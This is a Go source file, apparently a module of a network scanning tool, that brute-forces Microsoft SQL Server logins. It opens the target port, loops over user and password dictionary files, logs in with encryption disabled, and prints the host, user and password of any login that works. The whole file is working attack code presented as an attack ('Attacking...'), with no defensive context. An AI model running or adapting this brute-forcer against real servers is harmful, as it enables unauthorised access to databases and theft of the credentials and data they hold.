package mssql

import (
	"fmt"
	"database/sql"
	"strconv"

	_"github.com/denisenkom/go-mssqldb"

	"github.com/fatih/color"

	"port"
	"dic"

)

func MssqlAuth(ip string, port int, user string, pass string)(result bool, err error){
	result = false
	db, err := sql.Open("mssql", "server=" + ip + ";user id=" + user + ";password=" + pass + ";port=" + strconv.Itoa(port) + ";encrypt=disable")
	if err == nil{
		defer db.Close()
		if db.Ping() == nil{
			result = true
		}
	}
	return result, err
}

func MssqlScan(target string, ConfigPort int, ConfigUser string, ConfigPass string){
	if port.PortCheck(target, ConfigPort){
		if dic.FileIsExit(ConfigUser){
			if dic.FileIsExit(ConfigPass){
				fmt.Println("Attacking... " + target)
				Loop:
				for _, user := range dic.UserDic(ConfigUser){
					for _, password := range dic.UserDic(ConfigPass){
						//fmt.Println("Check..." + target + " " + user + " " + password)
						res, err := MssqlAuth(target, ConfigPort, user, password)
						if res == true && err == nil{
							//color.Green("mssql-------" + target + "-------" + strconv.Itoa(ConfigPort) + "-------" + user + "-------" + password)
							fmt.Print("[")
							color.Green(strconv.Itoa(ConfigPort))
							fmt.Print("]")
							fmt.Print("[")
							color.Green("mssql")
							fmt.Print("]\thost: ")
							color.Green(target)
							fmt.Print("\tuser: ")
							color.Green(user)
							fmt.Print("\tpass: ")
							color.Green(password + "\n")
							break Loop
						}
					}
				}
			} else {
				color.Red("pass file not exit!")
			}
		} else {
			color.Red("user file not exit!")
		}
	}
}